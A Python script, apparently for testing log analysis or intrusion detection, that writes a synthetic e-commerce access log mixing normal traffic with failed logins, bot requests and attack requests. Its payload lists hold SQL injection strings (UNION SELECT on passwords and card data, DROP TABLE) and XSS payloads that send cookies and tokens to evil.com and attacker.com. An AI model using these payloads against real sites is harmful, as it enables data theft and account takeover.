import random
import datetime

# --- Configuration ---
OUTPUT_FILE = "access.log"
TOTAL_LINES = 500

# --- IP Pools ---
NORMAL_IPS = [f"192.168.1.{i}" for i in range(10, 50)]
ATTACKER_IPS = ["10.0.0.99", "172.16.0.55", "203.0.113.77", "198.51.100.42"]
BOT_IP = "45.152.66.201"  # Single IP for 50+ rapid requests

# --- User Agents ---
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]
BOT_UAS = [
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Wget/1.21.4",
    "libwww-perl/6.72",
]

# --- Normal Paths ---
NORMAL_PATHS = [
    "/", "/index.html", "/products", "/cart", "/checkout",
    "/api/products?category=electronics", "/api/products?category=clothing",
    "/api/user/profile", "/static/css/main.css", "/static/js/app.js",
    "/images/banner.jpg", "/about", "/contact", "/search?q=laptop",
    "/api/cart/add", "/api/orders", "/favicon.ico", "/robots.txt",
]

# --- Malicious Payloads ---
SQLI_PATHS = [
    "/api/products?id=1' UNION SELECT username,password FROM users--",
    "/search?q=1' UNION SELECT null,table_name FROM information_schema.tables--",
    "/api/user?id=1 UNION SELECT 1,2,3--",
    "/products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments--",
    "/api/login?user=admin'--",
    "/api/search?term=1; DROP TABLE users--",
    "/api/orders?id=1 OR 1=1--",
]

XSS_PATHS = [
    "/search?q=<script>document.cookie='stolen='+document.cookie</script>",
    "/api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script>",
    "/products?name=<img src=x onerror=alert(document.domain)>",
    "/api/user?name=<svg/onload=fetch('//attacker.com/'+localStorage.token)>",
    "/search?q=<iframe src=javascript:alert(1)></iframe>",
    "/api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))>",
]

# --- HTTP Methods & Status Codes ---
NORMAL_METHODS_STATUSES = [
    ("GET", "200"), ("GET", "200"), ("GET", "200"), ("GET", "304"),
    ("POST", "200"), ("POST", "201"), ("GET", "404"),
]


def random_timestamp(base_dt, offset_seconds=0):
    dt = base_dt + datetime.timedelta(seconds=offset_seconds)
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def make_log_line(ip, timestamp, method, path, status, size, referrer, user_agent):
    return (
        f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" '
        f'{status} {size} "{referrer}" "{user_agent}"'
    )


def generate_logs():
    lines = []
    base_time = datetime.datetime(2025, 6, 15, 0, 0, 0)
    time_counter = 0  # seconds offset from base

    # ------------------------------------------------------------------ #
    # 1. FAILED LOGIN ATTEMPTS — multiple attacker IPs, POST /api/login → 401
    # ------------------------------------------------------------------ #
    failed_login_count = 60
    for i in range(failed_login_count):
        ip = random.choice(ATTACKER_IPS)
        ts = random_timestamp(base_time, time_counter)
        time_counter += random.randint(5, 30)
        line = make_log_line(
            ip, ts, "POST", "/api/login", "401",
            str(random.randint(180, 240)),
            "https://www.ecommerce-site.com/login",
            random.choice(NORMAL_UAS),
        )
        lines.append(line)

    # ------------------------------------------------------------------ #
    # 2. SUSPICIOUS REQUESTS — SQLi and XSS payloads
    # ------------------------------------------------------------------ #
    suspicious_count = 50
    for i in range(suspicious_count):
        ip = random.choice(ATTACKER_IPS)
        ts = random_timestamp(base_time, time_counter)
        time_counter += random.randint(3, 20)
        if i % 2 == 0:
            path = random.choice(SQLI_PATHS)
        else:
            path = random.choice(XSS_PATHS)
        line = make_log_line(
            ip, ts, "GET", path, "400",
            str(random.randint(300, 600)),
            "-",
            random.choice(NORMAL_UAS),
        )
        lines.append(line)

    # ------------------------------------------------------------------ #
    # 3. BOT TRAFFIC — single IP (BOT_IP) making 55 rapid requests
    # ------------------------------------------------------------------ #
    bot_request_count = 55
    for i in range(bot_request_count):
        ts = random_timestamp(base_time, time_counter)
        time_counter += random.randint(0, 2)  # rapid-fire: 0-2 second gaps
        path = random.choice(NORMAL_PATHS + ["/api/products", "/sitemap.xml"])
        status = random.choice(["200", "200", "200", "429"])
        line = make_log_line(
            BOT_IP, ts, "GET", path, status,
            str(random.randint(500, 4000)),
            "-",
            random.choice(BOT_UAS),
        )
        lines.append(line)

    # ------------------------------------------------------------------ #
    # 4. NORMAL TRAFFIC — fill remaining lines to reach TOTAL_LINES
    # ------------------------------------------------------------------ #
    remaining = TOTAL_LINES - len(lines)
    for i in range(remaining):
        ip = random.choice(NORMAL_IPS)
        ts = random_timestamp(base_time, time_counter)
        time_counter += random.randint(1, 10)
        method, status = random.choice(NORMAL_METHODS_STATUSES)
        path = random.choice(NORMAL_PATHS)
        referrer = random.choice([
            "https://www.google.com/",
            "https://www.ecommerce-site.com/",
            "-",
        ])
        line = make_log_line(
            ip, ts, method, path, status,
            str(random.randint(200, 8000)),
            referrer,
            random.choice(NORMAL_UAS),
        )
        lines.append(line)

    # Shuffle all lines so threats are interspersed with normal traffic
    random.shuffle(lines)

    with open(OUTPUT_FILE, "w") as f:
        f.write("\n".join(lines) + "\n")

    print(f"[+] Generated {len(lines)} log lines → '{OUTPUT_FILE}'")
    print(f"    Failed logins  : {failed_login_count}")
    print(f"    Suspicious reqs: {suspicious_count}")
    print(f"    Bot requests   : {bot_request_count}")
    print(f"    Normal traffic : {remaining}")


if __name__ == "__main__":
    generate_logs()
